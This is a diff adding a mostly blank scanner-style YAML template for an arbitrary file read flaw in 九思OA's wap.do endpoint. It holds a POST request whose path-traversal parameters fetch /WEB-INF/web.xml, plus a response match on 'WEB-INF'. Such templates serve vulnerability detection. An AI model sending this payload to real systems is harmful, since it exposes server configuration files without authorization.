@@ -1,0 +1,19 @@
+id:
+
+info:
+  name: 九思OA wap.do 任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /jsoa/wap.do?method=downLoad
+  data: |
+    path=../&name=&FileName=/WEB-INF/web.xml
+response1:
+  headers:
+  body: WEB-INF
+  code:
+requests2:
+response2:
